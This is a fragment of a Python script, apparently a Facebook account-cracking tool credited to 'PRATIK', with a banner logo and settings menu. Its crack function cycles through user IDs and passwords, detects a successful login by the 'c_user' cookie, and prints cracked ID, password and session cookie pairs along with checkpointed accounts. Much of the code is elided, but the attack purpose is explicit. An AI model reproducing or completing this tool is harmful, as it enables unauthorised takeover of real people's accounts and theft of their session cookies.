...
#------------------[ LOGO-LAKNAT ]-----------------#
______   \______   \  /  _  \__    ___/|   |    |/ _|
 |     ___/|       _/ /  /_\  \|    |   |   |      <  
 |    |    |    |   \/    |    \    |   |   |    |  \ 
 |____|    |____|_  /\____|__  /____|   |___|____|__ \
                  \/         \/                         

      
def info():         
    print("""\033[1;32m=====================\033[1;37m=====================
• DEVLOPER : \033[1;37mPRATIK-\033[1;32mPRATIK\033[1;37m
...
def setting():
	...
	print("[\u001b[32m3\033[1;37m] MIX IDZ BEST")
	linex()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[PRATIK-DONNA] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [PRATIK-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				...
				print(f'\r{P}[{K}PRATIK-CP{P}] {K}{idf}|{pw}')
